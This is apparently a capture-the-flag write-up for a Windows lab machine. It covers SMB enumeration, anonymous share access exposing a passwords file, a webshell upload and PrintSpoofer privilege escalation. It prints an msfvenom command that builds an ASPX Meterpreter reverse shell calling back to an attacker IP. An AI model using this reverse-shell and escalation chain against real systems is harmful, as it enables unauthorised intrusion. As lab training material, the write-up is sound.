## Overview 
This is a windows machine. You wil learn basic metasploit and basic pentest windows. 

## Write up 

## Enumeration 
Run `nmap` to scan the services. This server run web with 2 port (80, 49663) and smb share (445) 
  
![image](https://user-images.githubusercontent.com/22276823/147270203-dd3ed196-05b8-418e-87a5-b6125344c755.png) 
 
Scan smb vuln 
 
![image](https://user-images.githubusercontent.com/22276823/147270599-0585d73d-b8e5-4598-963d-5d2ea2a6df67.png) 

Connect to smb share with anonymous account 
 
![image](https://user-images.githubusercontent.com/22276823/147270831-ccae3482-8ecf-450a-aace-07b0a3d17c7e.png) 
 
This server share folder `nt4wrksv`. Connect this and get `passwords.txt` file 

![image](https://user-images.githubusercontent.com/22276823/147271108-965e4cf6-13d5-4c4d-9786-74710e8e315f.png) 

Check this file and i got 2 user, pass 

![image](https://user-images.githubusercontent.com/22276823/147271398-dc1a60bf-5204-4dd4-bcc2-6b2925fca042.png) 

Check permission on server. I known i can upload with anonymous account 

![image](https://user-images.githubusercontent.com/22276823/147271520-b2c2a934-ab09-490d-9be1-25a7a1c72d6f.png) 

## Exploit 

Because this server run on windows. I have create the reverse shell aspx. But it's seem like this server just print source code without run it. 
  
![image](https://user-images.githubusercontent.com/22276823/147272100-2d1ff816-a376-488a-a17c-3831a0375f0c.png) 

Let's try with webshell and get user flag

![image](https://user-images.githubusercontent.com/22276823/147272435-6507deb5-a4dd-41e2-83c6-cdcd4adb165f.png) 
 
To get reverse shell, i used metasploit to create reverse shell 

```
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.9.3.188 lport=4444 -f aspx -o shell.aspx 
```  
 Upload to server and get reverse shell  
  
![image](https://user-images.githubusercontent.com/22276823/147275061-af1fc217-56f6-4d9f-be29-d8f6300ed507.png)  

![image](https://user-images.githubusercontent.com/22276823/147272992-34b30903-44ae-4e13-8848-f593952350d7.png)  
 
![image](https://user-images.githubusercontent.com/22276823/147273229-1da03fdc-dccc-42fc-8e41-e67de694b6ed.png) 
 
Check privileges 
 
![image](https://user-images.githubusercontent.com/22276823/147273332-b533de06-f26f-436d-9641-93987775ffb6.png) 
 
After searching google. I used [Juicy Potato](https://github.com/ohpe/juicy-potato) but it doesn't work. Continue research, I found another way. This way exploit [PrintSpooler](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) service. Download execution file and put to server 

![image](https://user-images.githubusercontent.com/22276823/147274385-f5fb719c-4212-436e-a615-27e412b6de8e.png) 

![image](https://user-images.githubusercontent.com/22276823/147274580-47c6182d-c94e-4084-bbd3-96bdf9a3f40b.png) 

Run executable file and get root flag

![image](https://user-images.githubusercontent.com/22276823/147274689-f92b73d2-602b-4490-b0b0-6ccad6460ea8.png) 

![image](https://user-images.githubusercontent.com/22276823/147274768-87d5c338-f702-4f34-abd0-62792c594927.png) 

**Resources** 
1. https://github.com/itm4n/PrintSpoofer  
2. https://github.com/ohpe/juicy-potato  
3. https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505  
4. https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/  









